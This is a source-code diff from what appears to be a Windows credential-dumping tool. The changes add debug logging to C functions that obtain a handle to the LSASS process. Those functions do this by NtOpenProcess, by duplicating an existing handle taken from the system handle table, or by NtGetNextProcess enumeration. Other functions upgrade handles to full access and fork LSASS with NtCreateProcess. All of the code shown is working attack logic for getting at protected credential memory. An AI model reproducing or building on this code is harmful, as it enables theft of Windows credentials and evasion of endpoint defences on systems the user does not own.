@@ -31,8 +31,10 @@ HANDLE make_handle_full_access(
     if (!NT_SUCCESS(status))
     {
         syscall_failed("NtDuplicateObject", status);
+        DPRINT_ERR("Could not convert the handle to full access privileges");
         return NULL;
     }
+    DPRINT("The handle now has full access privileges");
     return hDuped;
 }
 
@@ -60,6 +62,7 @@ HANDLE obtain_lsass_handle(
     // duplicate an existing handle to LSASS
     else if (dup)
     {
+        DPRINT("Trying to find an existing LSASS handle to duplicate");
         hProcess = duplicate_lsass_handle(
             lsass_pid,
             permissions
@@ -68,6 +71,7 @@ HANDLE obtain_lsass_handle(
     // good old NtOpenProcess
     else if (lsass_pid)
     {
+        DPRINT("Using NtOpenProcess to get a handle to LSASS");
         hProcess = get_process_handle(
             lsass_pid,
             permissions,
@@ -79,9 +83,14 @@ HANDLE obtain_lsass_handle(
     {
         // the variable lsass_pid should always be set
         // this branch won't be called
+        DPRINT("Using NtGetNextProcess to get a handle to LSASS");
         hProcess = find_lsass(
             permissions
         );
+    }
+    if (hProcess)
+    {
+        DPRINT("LSASS handle: 0x%lx", (DWORD)(ULONG_PTR)hProcess);
     }
     return hProcess;
 }
@@ -108,6 +117,7 @@ HANDLE find_lsass(DWORD dwFlags)
         if (!NT_SUCCESS(status))
         {
             syscall_failed("NtGetNextProcess", status);
+            DPRINT_ERR("Could not find the LSASS process");
             return NULL;
         }
         if (is_lsass(hProcess))
@@ -170,6 +180,7 @@ HANDLE get_process_handle(
     else if (!NT_SUCCESS(status))
     {
         syscall_failed("NtOpenProcess", status);
+        DPRINT_ERR("Could not open handle to process %ld", dwPid);
         return NULL;
     }
 
@@ -185,6 +196,7 @@ PSYSTEM_HANDLE_INFORMATION get_all_handles(void)
     if (!handleTableInformation)
     {
         malloc_failed();
+        DPRINT_ERR("Could not get all handles");
         return NULL;
     }
     while (TRUE)
@@ -204,6 +216,7 @@ PSYSTEM_HANDLE_INFORMATION get_all_handles(void)
             if (!handleTableInformation)
             {
                 malloc_failed();
+                DPRINT_ERR("Could not get all handles");
                 return NULL;
             }
             continue;
@@ -211,9 +224,11 @@ PSYSTEM_HANDLE_INFORMATION get_all_handles(void)
         if (!NT_SUCCESS(status))
         {
             syscall_failed("NtQuerySystemInformation", status);
+            DPRINT_ERR("Could not get all handles");
             intFree(handleTableInformation); handleTableInformation = NULL;
             return NULL;
         }
+        DPRINT("Obtained the handle table");
         return handleTableInformation;
     }
 }
@@ -241,6 +256,7 @@ PPROCESS_LIST get_processes_from_handle_table(
     if (!process_list)
     {
         malloc_failed();
+        DPRINT_ERR("Could not get the processes from the handle table");
         return NULL;
     }
 
@@ -260,6 +276,11 @@ PPROCESS_LIST get_processes_from_handle_table(
             process_list->ProcessId[process_list->Count++] = handleInfo->UniqueProcessId;
         }
     }
+    DPRINT(
+        "Enumerated %ld handles from %ld processes",
+        handleTableInformation->Count,
+        process_list->Count
+    );
     return process_list;
 }
 
@@ -275,6 +296,7 @@ POBJECT_TYPES_INFORMATION QueryObjectTypesInfo(void)
         if (!obj_type_information)
         {
             malloc_failed();
+            DPRINT_ERR("Could not obtain the different types of objects");
             return NULL;
         }
 
@@ -287,12 +309,16 @@ POBJECT_TYPES_INFORMATION QueryObjectTypesInfo(void)
         );
 
         if (NT_SUCCESS(status))
+        {
+            DPRINT("Obtained the different types of objects");
             return obj_type_information;
+        }
 
         intFree(obj_type_information); obj_type_information = NULL;
     } while (status == STATUS_INFO_LENGTH_MISMATCH);
 
     syscall_failed("NtQueryObject", status);
+    DPRINT_ERR("Could not obtain the different types of objects");
     return NULL;
 }
 
@@ -304,7 +330,10 @@ BOOL GetTypeIndexByName(PULONG ProcesTypeIndex)
 
     ObjectTypes = QueryObjectTypesInfo();
     if (!ObjectTypes)
+    {
+        DPRINT_ERR("Could not find the index of type 'Process'");
         return FALSE;
+    }
 
     CurrentType = (POBJECT_TYPE_INFORMATION_V2)OBJECT_TYPES_FIRST_ENTRY(ObjectTypes);
     for (ULONG i = 0; i < ObjectTypes->NumberOfTypes; i++)
@@ -312,6 +341,7 @@ BOOL GetTypeIndexByName(PULONG ProcesTypeIndex)
         if (!_wcsicmp(CurrentType->TypeName.Buffer, PROCESS_TYPE))
         {
             *ProcesTypeIndex = i + 2;
+            DPRINT("Found the index of type 'Process': %ld", i+2);
             return TRUE;
         }
         CurrentType = (POBJECT_TYPE_INFORMATION_V2)OBJECT_TYPES_NEXT_ENTRY(CurrentType);
@@ -453,7 +483,10 @@ HANDLE fork_process(
             FALSE
         );
         if (!hProcess)
+        {
+            DPRINT_ERR("Could not fork LSASS");
             return NULL;
+        }
     }
 
     // fork the LSASS process
@@ -481,8 +514,15 @@ HANDLE fork_process(
     if (!NT_SUCCESS(status))
     {
         syscall_failed("NtCreateProcess", status);
-        // process forking failed
+        DPRINT_ERR("Could not fork LSASS");
         hCloneProcess = NULL;
+    }
+    else
+    {
+        DPRINT(
+            "Forked the LSASS process, new handle: 0x%lx",
+            (DWORD)(ULONG_PTR)hCloneProcess
+        );
     }
 
     NtClose(hProcess); hProcess = NULL;
